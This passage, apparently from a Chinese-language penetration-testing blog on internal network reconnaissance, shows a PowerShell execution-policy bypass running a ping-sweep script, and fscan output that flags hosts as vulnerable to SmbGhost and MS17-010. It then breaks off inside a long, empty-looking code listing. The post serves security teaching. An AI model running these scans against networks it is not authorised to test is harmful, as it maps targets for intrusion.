L29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8vY2FjZXJ0cy5k</span><br><span class="hljs-comment"># aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3J0MIGBBgNVHR8E</span><br><span class="hljs-comment"># ejB4MDqgOKA2hjRodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1</span><br><span class="hljs-comment"># cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v</span><br><span class="hljs-comment"># RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsME8GA1UdIARIMEYwOAYKYIZIAYb9</span><br><span class="hljs-comment"># bAACBDAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BT</span><br><span class="hljs-comment"># MAoGCGCGSAGG/WwDMB0GA1UdDgQWBBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAfBgNV</span><br><span class="hljs-comment"># HSMEGDAWgBRF66Kv9JLLgjEtUYunpyGd823IDzANBgkqhkiG9w0BAQsFAAOCAQEA</span><br><span class="hljs-comment"># PuwNWiSz8yLRFcgsfCUpdqgdXRwtOhrE7zBh134LYP3DPQ/Er4v97yrfIFU3sOH2</span><br><span class="hljs-comment"># 0ZJ1D1G0bqWOWuJeJIFOEKTuP3GOYw4TS63XX0R58zYUBor3nEZOXP+QsRsHDpEV</span><br><span class="hljs-comment"># +7qvtVHCjSSuJMbHJyqhKSgaOnEoAjwukaPAJRHinBRHoXpoaK+bp1wgXNlxsQyP</span><br><span class="hljs-comment"># u6j4xRJon89Ay0BEpRPw5mQMJQhCMrI2iiQC/i9yfhzXSUWW6Fkd6fp0ZGuy62ZD</span><br><span class="hljs-comment"># 2rOwjNXpDd32ASDOmTFjPQgaGLOBm0/GkxAG/AeB+ova+YJJ92JuoVP6EpQYhS6S</span><br><span class="hljs-comment"># kepobEQysmah5xikmmRR7zGCAigwggIkAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUw</span><br><span class="hljs-comment"># EwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20x</span><br><span class="hljs-comment"># MTAvBgNVBAMTKERpZ2lDZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcg</span><br><span class="hljs-comment"># Q0ECEALqUCMY8xpTBaBPvax53DkwCQYFKw4DAhoFAKB4MBgGCisGAQQBgjcCAQwx</span><br><span class="hljs-comment"># CjAIoAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGC</span><br><span class="hljs-comment"># NwIBCzEOMAwGCisGAQQBgjcCARUwIwYJKoZIhvcNAQkEMRYEFGGdjjPAicJNVNbF</span><br><span class="hljs-comment"># +Rz5j79kKh51MA0GCSqGSIb3DQEBAQUABIIBAHRy5Qa+5mmePnP9ZpS8YCsexj+6</span><br><span class="hljs-comment"># OvA2XD4lNpQEsvuW68ECTEpwUXCPSKIimKompsdKdNJ147fjvRPl1FTkC7G1XCn2</span><br><span class="hljs-comment"># qymNxFpUabdiKpyQL042k4o8Naa8CfQLsnlaG2boew6Jay9w8dlXGmuVG3CDtD5r</span><br><span class="hljs-comment"># mId6oTEZjauK3vU5+eUfDIMO6U7MaTF0C3ItmGyvfOENSnWTCSWoeRUSqHc8v/np</span><br><span class="hljs-comment"># 2qay6qvKFX8F5yMG4K5WGYFL5q37FKiMdsXiG3hj3xRYmr3g+yWoZm6AVBGGDOBk</span><br><span class="hljs-comment"># 62IpemyM98KuozkzTxUtvzbucaVnpu+l0z4yrGbqIVBNxe+gu7QchKrjDVc=</span><br><span class="hljs-comment"># SIG # End signature block</span><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;<br></code></pre></td></tr></table></figure><h3 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h3><p><a href="https://github.com/shadow1ng/fscan">fscan</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">fscan.exe -h 192.168.7.1-255 -p 22,445<br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;<br>\____/     |___/\___|_|  \__,_|\___|_|\_\<br>                     fscan version: 1.5.1<br>scan start<br>(icmp) Target &#x27;192.168.7.7&#x27; is alive<br>(icmp) Target &#x27;192.168.7.110&#x27; is alive<br>(icmp) Target &#x27;192.168.7.107&#x27; is alive<br>icmp alive hosts len is: 3<br>192.168.7.110:445 open<br>192.168.7.7:445 open<br>192.168.7.107:445 open<br>192.168.7.110 CVE-2020-0796 SmbGhost Vulnerable<br>192.168.7.110  (Windows 10 Pro 18363)<br>[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)<br>[+] 192.168.7.107       MS17-010        (Windows 7 Professional 7601 Service Pack 1)<br>scan end<br></code></pre></td></tr></table></figure><p>netdiscover,snscan,nmap,msf 山不在高…</p><h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><ul><li>端口 banner 信息</li><li>端口上运行的服务</li><li>常见应用的默认端口</li></ul><h3 id="powershell-1"><a href="#powershell-1" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span 